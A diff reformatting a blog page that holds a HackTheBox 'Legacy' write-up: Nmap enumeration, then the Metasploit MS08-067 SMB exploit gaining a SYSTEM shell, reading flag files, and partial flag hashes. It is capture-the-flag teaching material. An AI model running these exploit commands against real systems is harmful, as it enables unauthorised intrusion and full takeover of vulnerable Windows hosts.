@@ -1,4 +1,49 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Manthan</title><link rel=icon type=image/webp sizes=32x32 href=/static/images/manthan-32x32.png.webp><link rel=stylesheet type=text/css media=screen href=/static/css/style.rainbow.css><link rel=stylesheet href=/static/css/atelier-forest-light.css><script charset=UTF-8 src=/static/js/highlight.min.js></script><script charset=UTF-8 src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script></head><body><div class=header><table><tr><td><a href=/index.html class=menu_home>मंथन</a></td><td> | </td><td><a href=/archive.html class=menu_archive>Archive</a></td><td> | </td><td><a href=/tags.html class=menu_tags>Tags</a></td><td> | </td><td><a href=/stats.html class=menu_stats>Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[HackTheBox] Legacy</h1><p><a href=/posts/20191029_vulnhub-lazysysadmin1.html> « </a>📅 published on <code>01/Nov/2019</code><a href=/posts/20191101_htb-lame.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for HTB VM <a href=https://www.hackthebox.eu/home/machines/profile/2>Legacy</a>. Here are stats for this machine from <a href=https://github.com/7h3rAm/machinescli>machinescli</a>:</p><p class=nested><img alt=writeup.overview.machinescli src=/static/files/posts_htb_legacy/machinescli.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>Killchain</h3><p class=nested>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_htb_legacy/killchain.png.webp></p><h3 class="h3 collapsible" onclick=toggle(this);>TTPs</h3><p class=nested>1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href=https://github.com/7h3rAm/writeups#exploit_smb_ms08_067>exploit_smb_ms08_067</a> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>मंथन | Manthan</title>
+    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
+    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" class="menu_home">मंथन</a></td><td> | </td>
+          <td><a href="/archive.html" class="menu_archive">Archive</a></td><td> | </td>
+          <td><a href="/tags.html" class="menu_tags">Tags</a></td><td> | </td>
+          <td><a href="/stats.html" class="menu_stats">Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[HackTheBox] Legacy</h1>
+                  <p><a href="/posts/20191029_vulnhub-lazysysadmin1.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-lame.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/2">Legacy</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_legacy/machinescli.png.webp" /></p>
+<h3>Killchain</h3>
+<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_legacy/killchain.png.webp" /></p>
+<h3>TTPs</h3>
+<p>1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms08_067">exploit_smb_ms08_067</a>  </p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Fri Nov  1 14:44:27 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.legacy/results/10.10.10.4/scans/xml/_quick_tcp_nmap.xml 10.10.10.4
 Nmap scan report for 10.10.10.4
 Host is up, received user-set (0.057s latency).
 Scanned at 2019-11-01 14:44:28 PDT for 276s
@@ -49,28 +94,46 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Nov  1 14:49:04 2019 -- 1 IP address (1 host up) scanned in 276.38 seconds
-</code></pre><p class=nested>2. Here's the summary of open ports and associated <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> scan files: </p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_htb_legacy/openports.png.webp> </p><p class=nested>3. From the Nmap scan results, we find that the target system has SMB service running and is a Windows XP system: </p><pre class=nested><code>| smb-os-discovery:
+</code></pre>
+<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
+<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_legacy/openports.png.webp" />  </p>
+<p>3. From the Nmap scan results, we find that the target system has SMB service running and is a Windows XP system:  </p>
+<pre><code>| smb-os-discovery:
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
 |   Computer name: legacy
 |   NetBIOS computer name: LEGACY\x00
 |   Workgroup: HTB\x00
 |_  System time: 2019-11-01T20:44:53+02:00
-</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>137/udp  |  netbios-ns    |  Microsoft Windows netbios-ns (workgroup: HTB)
+</code></pre>
+<h3>Findings</h3>
+<h4>Open Ports</h4>
+<pre><code>137/udp  |  netbios-ns    |  Microsoft Windows netbios-ns (workgroup: HTB)
 139/tcp  |  netbios-ssn   |  Microsoft Windows netbios-ssn
 445/tcp  |  microsoft-ds  |  Windows XP microsoft-ds
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. For a Microsoft Windows XP system with open SMB, we use the MSF <a href=https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067>MS08-067</a> exploit <code>windows/smb/ms08_067_netapi</code> and gain a shell with elevated privileges on the target system: </p><pre class=nested><code>msfconsole
+</code></pre>
+<h2>Phase #2: Exploitation</h2>
+<p>1. For a Microsoft Windows XP system with open SMB, we use the MSF <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2008/ms08-067">MS08-067</a> exploit <code>windows/smb/ms08_067_netapi</code> and gain a shell with elevated privileges on the target system:  </p>
+<pre><code>msfconsole
   use exploit/windows/smb/ms08_067_netapi
   set RHOST 10.10.10.4
   set LHOST 10.10.14.18
   show options
   exploit
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_htb_legacy/screenshot01.png.webp> </p><p class=nested>2. We then obtain further information about the system and read the contents of both <code>user.txt</code> and <code>root.txt</code> files to comeplete the challenge: </p><pre class=nested><code>ipconfig
+</code></pre>
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_legacy/screenshot01.png.webp" />  </p>
+<p>2. We then obtain further information about the system and read the contents of both <code>user.txt</code> and <code>root.txt</code> files to comeplete the challenge:  </p>
+<pre><code>ipconfig
 systeminfo
 dir user.txt /s /p
 type &quot;C:\Documents and Settings\john\Desktop\user.txt&quot;
 type &quot;C:\Documents and Settings\Administrator\Desktop\root.txt&quot;
-</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_htb_legacy/screenshot02.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_htb_legacy/screenshot03.png.webp> </p><p class=nested><img alt=writeup.exploitation.steps.2.3 src=/static/files/posts_htb_legacy/screenshot04.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>ntauth/system@LEGACY&gt; id
+</code></pre>
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_legacy/screenshot02.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_legacy/screenshot03.png.webp" />  </p>
+<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_legacy/screenshot04.png.webp" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>ntauth/system@LEGACY&gt; id
 NT AUTHORITY\SYSTEM
 ntauth/system@LEGACY&gt;  
 ntauth/system@LEGACY&gt; uname
@@ -91,6 +154,35 @@ ntauth/system@LEGACY&gt;
 ntauth/system@LEGACY&gt; users
 Administrator
 john
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
+</code></pre>
+<h2>Loot</h2>
+<h3>Flags</h3>
+<pre><code>C:\Documents and Settings\john\Desktop\user.txt: e69af0e4f443de7e................
 C:\Documents and Settings\Administrator\Desktop\root.txt: 993442d258b0e0..................
-</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.hackthebox.eu/home/machines/profile/2>https://www.hackthebox.eu/home/machines/profile/2</a> </li><li><a href=https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02>https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20191029_vulnhub-lazysysadmin1.html>[VulnHub] LazySysAdmin: 1...</a> « | » <a href=/posts/20191101_htb-lame.html>[HackTheBox] Lame...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script><div class="footer footercenter"><span><a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a></span></div></body></html>
+</code></pre>
+<h2>References</h2>
+<ul>
+<li><a href="https://www.hackthebox.eu/home/machines/profile/2">https://www.hackthebox.eu/home/machines/profile/2</a>  </li>
+<li><a href="https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02">https://medium.com/@_C_3PJoe/htb-retired-box-walkthrough-legacy-147bbcc9ff02</a>  </li>
+</ul>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20191029_vulnhub-lazysysadmin1.html">[VulnHub] LazySysAdmin: 1...</a> « | » <a href="/posts/20191101_htb-lame.html">[HackTheBox] Lame...</a> »</p>
+            </div>
+    <div class="footer footercenter">
+      <span>
+        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+      </span>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(s){
+        s.classList.toggle("expanded");
+        for(var l=s.nextElementSibling;l;){
+          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+        }
+      }
+    </script>
+    <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
+  </body>
+</html>
